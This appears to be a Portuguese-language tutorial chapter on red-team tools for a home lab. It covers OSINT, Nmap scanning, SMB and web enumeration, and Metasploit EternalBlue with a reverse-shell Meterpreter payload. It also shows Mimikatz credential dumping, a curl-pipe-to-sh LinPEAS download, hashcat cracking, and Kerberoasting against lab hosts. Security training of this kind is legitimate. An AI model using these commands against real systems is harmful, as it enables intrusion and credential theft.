# Parte 5 — Ferramentas Red Team

Este é o arsenal ofensivo do lab, organizado na ordem natural de um ataque: primeiro você observa sem tocar (recon passivo), depois mapeia a superfície (recon ativo e enumeração), explora, sobe de privilégio, quebra senhas com a GPU e, por fim, ataca o Active Directory. Cada seção traz os comandos que você vai usar de verdade.

## 5.1 Reconhecimento passivo e OSINT

Coleta de informações sem enviar um único pacote ao alvo — indetectável. Trate seus alvos como se fossem uma empresa real.

### theHarvester — coleta automática de OSINT

```bash
theHarvester -d empresa.com -b all                              # tudo
theHarvester -d empresa.com -b google,bing,linkedin,shodan      # fontes específicas
theHarvester -d empresa.com -b all -f resultado_osint           # salvar em HTML
```

- [theHarvester no GitHub](https://github.com/laramies/theHarvester)
- [OSINT Framework](https://osintframework.com) · mapa visual de todas as fontes
- [Shodan.io](https://www.shodan.io) · motor de busca de dispositivos — crie conta gratuita

## 5.2 Reconhecimento ativo — Nmap em profundidade

| Comando | Tipo de scan | Quando usar |
|---|---|---|
| `nmap -sn 192.168.200.0/24` | Host discovery | Descobrir hosts ativos |
| `nmap -sS alvo` | SYN scan (stealth) | Scan padrão, mais silencioso |
| `nmap -sV alvo` | Version detection | Identificar versões para buscar CVEs |
| `nmap -O alvo` | OS detection | Fingerprinting do sistema operacional |
| `nmap -sC alvo` | Default NSE scripts | Enumeração e detecção |
| `nmap -p- alvo` | Todas as 65535 portas | Scan completo — mais lento |
| `nmap -A alvo` | Aggressive | Combina `-sV -O -sC` — barulhento |
| `nmap --script vuln alvo` | Vuln scan | Testa CVEs conhecidas com NSE |

```bash
# Scan completo padrão para o lab
nmap -sS -sV -sC -O -p- 192.168.200.10 -oA scan_completo

# Vulnerabilidades SMB
nmap --script smb-vuln* -p 445 192.168.200.20

# Agressivo (no lab, barulho não importa)
nmap -A -T4 192.168.200.0/24 -oN rede_completa.txt

# UDP (serviços menos óbvios)
nmap -sU --top-ports 100 192.168.200.10
```

- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Nmap NSE Scripts](https://nmap.org/nsedoc)

## 5.3 Enumeração de serviços

### SMB e Windows

```bash
enum4linux-ng -A 192.168.200.20             # enumeração completa Windows/Samba

smbclient -L //192.168.200.20 -N            # listar shares
smbclient //192.168.200.20/Users -N

crackmapexec smb 192.168.200.0/24
crackmapexec smb 192.168.200.20 -u '' -p '' --shares
crackmapexec smb 192.168.200.20 -u 'guest' -p '' --users
```

📖 [Enum4linux-ng](https://github.com/cddmp/enum4linux-ng)

### Web

```bash
gobuster dir -u http://192.168.200.30 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt
ffuf -u http://192.168.200.30/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
nikto -h http://192.168.200.30 -output nikto.html -Format html
whatweb http://192.168.200.30
```

📖 [SecLists](https://github.com/danielmiessler/SecLists) · a coleção definitiva de wordlists

## 5.4 Exploração

### Metasploit Framework

```bash
msfconsole

# Buscar exploits
search ms17-010
search type:exploit platform:windows smb

# EternalBlue no MSF3 Windows
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.200.20
set LHOST 192.168.100.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# Pós-exploração com Meterpreter
sysinfo && getuid
getsystem
hashdump
load kiwi && creds_all
run post/multi/recon/local_exploit_suggester
```

- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed) · curso gratuito — o melhor recurso
- [Metasploit Docs](https://docs.metasploit.com)

### Burp Suite — web hacking

```
# Proxy: Burp na porta 8080 → Firefox proxy manual 127.0.0.1:8080
# Instale o certificado CA do Burp no browser

Fluxo básico:
1. Intercept ON → navegue no DVWA → veja a requisição
2. Envie para o Repeater (Ctrl+R) → modifique → reenvie
3. Intruder para ataques de posição (brute force, fuzzing)
```

- [Burp Suite Community](https://portswigger.net/burp/communitydownload)
- [PortSwigger Web Academy](https://portswigger.net/web-security) · **o melhor** recurso gratuito de web security

## 5.5 Pós-exploração e escalada de privilégios

### Linux

```bash
# LinPEAS — enumera tudo para escalada
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Checagens manuais
sudo -l                              # sudo sem senha
find / -perm -u=s 2>/dev/null        # binários SUID
cat /etc/crontab                     # cron jobs
getcap -r / 2>/dev/null              # capabilities
cat /etc/passwd | grep -v nologin    # usuários válidos
```

- [GTFOBins](https://gtfobins.github.io) · como explorar cada binário Linux para PrivEsc
- [HackTricks — Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

### Windows

```bat
winpeas.exe                          :: enumera caminhos de escalada

whoami /priv
whoami /groups
systeminfo | findstr /i "hotfix"
```

```
# Mimikatz — extração de credenciais
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::dcsync /domain:corp.lab /all
```

- [LOLBAS Project](https://lolbas-project.github.io) · Living Off the Land — escalada sem ferramentas externas
- [HackTricks — Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

## 5.6 Senhas e cracking — RTX 4060 em ação

```bash
# Identificar o tipo de hash
hash-identifier
hashid 'hash_aqui'

# Hashcat com GPU — modos mais usados
hashcat -m 0     hash.txt rockyou.txt          # MD5
hashcat -m 1000  hash.txt rockyou.txt          # NTLM
hashcat -m 1800  hash.txt rockyou.txt          # SHA-512crypt (/etc/shadow)
hashcat -m 13100 tgs.txt  rockyou.txt          # Kerberoasting TGS
hashcat -m 5600  ntlmv2.txt rockyou.txt        # NetNTLMv2 (Responder)

# Ataques com regras — muito mais eficaz
hashcat -m 1000 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# Brute force com máscara
hashcat -m 1000 ntlm.txt -a 3 ?u?l?l?l?l?d?d   # padrão tipo 'Senha12'

# John (alternativa via CPU)
john shadow.txt --wordlist=rockyou.txt
john shadow.txt --rules --wordlist=rockyou.txt
```

- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) · todos os tipos suportados
- [CrackStation](https://crackstation.net) · quebra MD5/SHA1/NTLM fracos online

## 5.7 Ataques a Active Directory

### BloodHound — mapeamento de caminhos de ataque

```bash
sudo apt install -y bloodhound neo4j
sudo neo4j start

# Coletar dados do AD a partir do Kali (sem acesso Windows)
bloodhound-python -u usuario -p 'senha' -d corp.lab -ns 192.168.200.40 -c All

bloodhound &   # abrir e importar o ZIP

# Queries úteis:
#  'Find Shortest Path to Domain Admins'
#  'List all Kerberoastable accounts'
#  'Find AS-REP Roastable Users'
```

### Kerberoasting e AS-REP Roasting

```bash
# Extrair TGS tickets de contas com SPN
python3 GetUserSPNs.py corp.lab/usuario:senha -dc-ip 192.168.200.40 -request -output tgs_hashes.txt

# Quebrar offline com a RTX 4060
hashcat -m 13100 tgs_hashes.txt rockyou.txt

# AS-REP Roasting (contas sem pré-autenticação Kerberos)
python3 GetNPUsers.py corp.lab/ -usersfile users.txt -dc-ip 192.168.200.40 -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

- [Impacket](https://github.com/fortra/impacket) · suite de ferramentas para protocolos Windows
- [BloodHound Docs](https://support.bloodhoundenterprise.io/hc/en-us)
- [HackTricks — AD Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)

---

⏮️ Anterior: **[Parte 4 — Máquinas virtuais](04-maquinas-virtuais.md)** · ⏭️ Próximo: **[Parte 6 — Blue Team](06-blue-team.md)** · [↩︎ Índice](../README.md)
